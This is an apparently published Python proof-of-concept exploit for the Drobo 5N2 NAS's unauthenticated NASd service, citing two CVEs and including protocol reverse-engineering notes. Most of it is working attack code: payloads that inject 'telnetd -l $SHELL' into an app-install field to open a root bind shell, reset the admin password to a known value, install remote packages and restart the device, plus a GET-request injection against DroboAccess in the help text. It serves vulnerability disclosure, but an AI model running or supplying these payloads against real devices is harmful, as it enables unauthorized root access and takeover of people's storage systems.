# Exploit Title: Drobo 5N2 4.1.1 - Remote Command Injection
# Date: 2020-03-12
# Exploit Author: Rick Ramgattie, Ian Sindermann
# Vendor Homepage: https://www.drobo.com/
# Version: 4.1.1 and lower.
# CVE: CVE-2018-14709, CVE-2018-14701
###

#!/usr/bin/env python3

# nasty.py - A proof-of-concept utility for (maliciously) interacting with the Drobo NASd service.
# This utility leverages the lack of any real authentication mechanism to perform arbitrary actions.
# These actions include:
# - Getting device status.
# - Installing applications.
# - Resetting admin credentials.
# - Popping root shells.
# - Turning on party mode.
# This set of exploits is known to affect the Drobo 5N2, firmware version 4.1.1 and lower.
# As of 2020-03-12, newer firmware versions appear to be vulnerable as well, but this has not been verified.
# Most of the Drobo product line also appears to be vulnerable. Again, this has not been verified.
# These vulnerabilities were disclosed to the manufacturer on 2018-07-10.
# More vulnerabilities for this device may be found here: https://blog.securityevaluators.com/4f1d885df7fc
###
# Product of ISE Labs.
# - http://www.securityevaluators.com/
# - @ISESecurity
###


# RE Notes:
#                                 ,-- Encryption bool?
# Handshake Preamble:       *    /\
# 44 52 49 4e 45 54 54 4d  07 01 00 00 00 00 00 88
# \_____________________/  \_________/ \_________/
#  Static string.           To/from     Size of
#  "DIRNETTM"               server?     next message
#
# Handshake
# 64 72 61 31 37 33 32 30  32 33 30 30 30 31 30 00  00 00 00 00 64 72 61 31  37 33 32 30 32 33 30 30  30 31 30 00 00 00 00 00  00 00...
# \______________________________________________/  \_________/ \_______________________________________________/ \_________________-->
#  Device serial number with NULL padding.           NULL        Device serial number with NULL padding. ESAID?    88 bytes of NULL
#  "dra173202300010"                                             "dra173202300010"
#
# The stat port returns an "ESAID" value that is identical to the serial number on this device (5N2).
# One of the serial numbers in this packet may actually be the ESAID.
#
# Preamble:                 *
# 44 52 49 4e 45 54 54 4d  0a 01 00 00 00 00 00 88
# \_____________________/  \_________/ \_________/
#  Static string.           To/from     Size of
#  "DIRNETTM"               server?     next message
#
# Message:
# XX XX XX XX XX XX XX XX  00
# \_____________________/  \/
# Arbitrary length string  NULL terminator
#
#
# Protocol flow:
#   Initial handshake:         ,----- 2nd nibble in 3rd section is different. "07 01 00 00" instead of "0a 01 00 00" #TODO: why?
#   |  c -> s: Preamble.    <-'    \_
#   |  c -> s: Message: Handshake  / `- These two are normally sent as one packet.
#   v  c <- s: Preamble.    <-------- 2nd nibble in 3rd section is different. "87 01 00 00" instead of "8a 01 00 00" #TODO: why?
#   Loop:
#   +> c -> s: Preamble.
#   |  c -> s: Message: Command.
#   |  c <- s: Preamble.
#   +- c <- s: Message: Results.  > Large responses are split into chunks. Must use size from preamble.


import argparse
import logging
import re
import socket
import struct
import sys


LOG_FORMAT = '[%(levelname)s]: %(message)s'
BUFFER_SIZE = 1024
HANDSHAKE_PREAMBLE = b'\x44\x52\x49\x4e\x45\x54\x54\x4d\x07\x01\x00\x00'
PREAMBLE           = b'\x44\x52\x49\x4e\x45\x54\x54\x4d\x0a\x01\x00\x00'
PREAMBLE_LEN = 16

# Note: Payloads usually contain the device's serial number. Replace this with
# '{serial}' so `send_msg` can insert the target's serial.
PAYLOADS = {
    "daccess" :'<TMCmd><CmdID>78</CmdID><Params><Name>DroboAccess</Name><Action>Install</Action><Data>ftp://updates.drobo.com/droboapps/2.1/downloads/DroboAccess.tgz</Data></Params><ESAID>{serial}</ESAID></TMCmd>',
    "dropbear":'<TMCmd><CmdID>78</CmdID><Params><Name>dropbear</Name><Action>Install</Action><Data>ftp://updates.drobo.com/droboapps/2.1/downloads/dropbear.tgz</Data></Params><ESAID>{serial}</ESAID></TMCmd>',
    "getadmin":'<TMCmd><CmdID>30</CmdID><Params><DRINasAdminConfig>DRINasAdminConfig</DRINasAdminConfig><DRINasDroboAppsConfig>DRINasDroboAppsConfig</DRINasDroboAppsConfig></Params><ESAID>{serial}</ESAID></TMCmd>',
    "getnet"  :'<TMCmd><CmdID>30</CmdID><ESAID>{serial}</ESAID><Params><Network>Network</Network></Params></TMCmd>',
    "gettemp" :'<TMCmd><CmdID>61</CmdID><ESAID>{serial}</ESAID></TMCmd>',
    "partyon" :'<TMCmd><CmdID>26</CmdID><Params><IdentifyInterval>900</IdentifyInterval></Params><ESAID>{serial}</ESAID></TMCmd>',
    "partyoff":'<TMCmd><CmdID>26</CmdID><Params><IdentifyInterval>0</IdentifyInterval></Params><ESAID>{serial}</ESAID></TMCmd>',
    "popit"   :'<TMCmd><CmdID>78</CmdID><Params><Name>Drobo`telnetd -l $SHELL -p 8383`Access</Name><Action>Install</Action><Data>bork</Data></Params><ESAID>{serial}</ESAID></TMCmd>',
    "restart" :'<TMCmd><CmdID>21</CmdID><ESAID>{serial}</ESAID></TMCmd>',
    "setadmin":'<TMCmd><CmdID>31</CmdID><Params><DRINASConfig><DRINasAdminConfig><UserName>admin</UserName><Password>ono</Password><ValidPassword>1</ValidPassword><EncryptedPassword>0</EncryptedPassword></DRINasAdminConfig><DRINasDroboAppsConfig><Version>11</Version><Enabled>1</Enabled></DRINasDroboAppsConfig></DRINASConfig></Params><ESAID>{serial}</ESAID></TMCmd>',
    "test"    :'<TMCmd><CmdID>82</CmdID><Params><Time>1521161215</Time><GMTOffset>4294966876</GMTOffset></Params><ESAID>{serial}</ESAID></TMCmd>',
    "stdin"   :'Handled elsewhere.'}

DEFAULT_PORT_STAT = 5000
DEFAULT_PORT_CMD = 5001
DEFAULT_TIMEOUT = None
HELP_EPILOG='''
PAYLOADS
  daccess  - Installs DroboAccess on the target device. At the time of writing,
             DroboAccess has numerous unauthenticated command injection
             vulnerabilities. Try the following:
             GET /DroboAccess/delete_user?username=test';/usr/sbin/telnetd -l /bin/sh -p 8383
             - A long delay and response of "<Error>0</Error>" is expected.
  dropbear - Installs dropbear on the target device.
             - A response of "<Error>0</Error>" is expected.
  getadmin - Returns the target's current (redacted) admin configuration.
  gettemp  - Returns the target's system info (temperature and uptime).
  getnet   - Returns the target's network info.
  partyon  - Enables "party mode" on the target. This will cause the target
             device's lights to blink for 15 minutes.
  partyoff - Prematurely disables "party mode".
  popit    - Exploits CVE-2019-6801 to spawn a root bind shell on port 8383.
             - A response of "<Error>1</Error>" is expected.
  restart  - Restarts the target device.
  setadmin - Sets administrative options on the target.
             - Username: admin
             - Password: ono
             - Apps enabled: yes
  stdin    - Reads data from STDIN and sends it as a command.
'''


def recv_message(s):
    preamble = s.recv(PREAMBLE_LEN)
    msg_len = struct.unpack(">I", preamble[-4:])[0] # Parse expected message length from preamble.
    message = ''
    if msg_len <= 0:
        return(message)
    while True:
        message += s.recv(BUFFER_SIZE).decode('utf-8')
        if len(message) >= msg_len:
            return(message) # There will be a null at the end. It should be fine.


def send_handshake(s, serial):
    serial_bytes = serial.encode('utf-8')
    hs_body  = struct.pack("16s", serial_bytes) # 16 byte padded string containing device serial number.
    hs_body += struct.pack(">I", 0) # 4 byte field, presumably uint, only seen as zero.
    hs_body += struct.pack("16s", serial_bytes) # 16 byte padded string containing device serial number. again...
    hs_body += struct.pack("184x") # 184 bytes of NULL padding.
    size_bytes = struct.pack(">I", len(hs_body)) # Size of message body. Send with preamble.
    hs_data = HANDSHAKE_PREAMBLE + size_bytes + hs_body
    logging.debug(repr(hs_data))
    s.send(hs_data)


def send_message(s, serial, message):
    msg_body = message.format(serial=serial) # Add target device's serial number.
    msg_body_bytes = msg_body.encode('utf-8')
    msg_body_bytes += struct.pack("x") # NULL terminator.
    size_bytes = struct.pack(">I", len(msg_body_bytes)) # Size of XML body. Send with preamble.
    msg_data = PREAMBLE + size_bytes + msg_body_bytes
    logging.debug(repr(msg_data))
    s.send(msg_data)


aparser = argparse.ArgumentParser(
        description='nasty.py - A proof-of-concept utility for (maliciously) interacting with the Drobo NASd service.',
        epilog=HELP_EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
aparser.add_argument("host", help='Host or IP address of the target Drobo.')
aparser.add_argument("payload", help='Payload to use. See PAYLOADS.')
aparser.add_argument("-p", "--portstat", help='Specify a non-default stat port on the Drobo.', default=DEFAULT_PORT_STAT, type=int)
aparser.add_argument("-P", "--portcmd", help='Specify a non-default command port on the Drobo.', default=DEFAULT_PORT_CMD, type=int)
aparser.add_argument("-s", "--serial", help='Manually set the target serial number. Skips serial number detection.')
aparser.add_argument("-t", "--timeout", help='Set a timeout in seconds for socket operations.', default=DEFAULT_TIMEOUT, type=float)
aparser.add_argument("-v", "--verbose", help='Increase verbosity.', action='store_true')
args = aparser.parse_args()

# Basic check for color support.
if sys.stdout.isatty() and sys.platform in ["linux","linux2","darwin"]:
    logging.addLevelName(logging.NOTSET,   "\033[39m????\033[0m")
    logging.addLevelName(logging.DEBUG,    "\033[37mDBUG\033[0m")
    logging.addLevelName(logging.INFO,     "\033[96mINFO\033[0m")
    logging.addLevelName(logging.WARNING,  "\033[93mWARN\033[0m")
    logging.addLevelName(logging.ERROR,    "\033[95mERRR\033[0m")
    logging.addLevelName(logging.CRITICAL, "\033[91mCRIT\033[0m")
else: 
    logging.addLevelName(logging.NOTSET,   "????")
    logging.addLevelName(logging.DEBUG,    "DBUG")
    logging.addLevelName(logging.INFO,     "INFO")
    logging.addLevelName(logging.WARNING,  "WARN")
    logging.addLevelName(logging.ERROR,    "ERRR")
    logging.addLevelName(logging.CRITICAL, "CRIT")

if args.verbose:
    logging.basicConfig(format=LOG_FORMAT, level=logging.DEBUG)
else:
    logging.basicConfig(format=LOG_FORMAT, level=logging.INFO)

if args.payload == 'stdin':
    logging.info("Reading payload from STDIN.")
    payload_xml = sys.stdin.read()
    logging.debug(payload_xml)
else:
    payload_xml = PAYLOADS[args.payload]


logging.info("Connecting...")
# Connect to the stat port. This is required for the cmd port to work.
# The stat port also gives us the serial number.
sock_stat = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_stat.settimeout(args.timeout)
sock_stat.connect((args.host, args.portstat))
# Connect to the cmd port.
sock_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_cmd.settimeout(args.timeout)
sock_cmd.connect((args.host, args.portcmd))

# Pull the serial number from the stat port.
logging.info("Pulling serial number...")
stat_msg = sock_stat.recv(BUFFER_SIZE)
if args.serial:
    serial = args.serial
else:
    m = re.search('<mSerial>([^<]+)</mSerial>', stat_msg.decode('utf-8'))
    if not m:
        logging.critical("Could not determine target's serial number!")
        logging.debug(stat_msg)
        sys.exit(100)
    serial = m.group(1)
    logging.info("Identified serial: " + serial)

# Perform a handshake with the cmd port. Requires the serial num.
logging.info('Performing handshake...')
send_handshake(sock_cmd, serial)
recv_message(sock_cmd) # Blank response - trash.

# Send the payload.
logging.info("Sending payload...")
send_message(sock_cmd, serial, payload_xml)
logging.info("Waiting for response...")
resp = recv_message(sock_cmd)
logging.info("Response:\n" + resp)

# Cleanup.
sock_cmd.close()
sock_stat.close()
logging.info("Donezo.")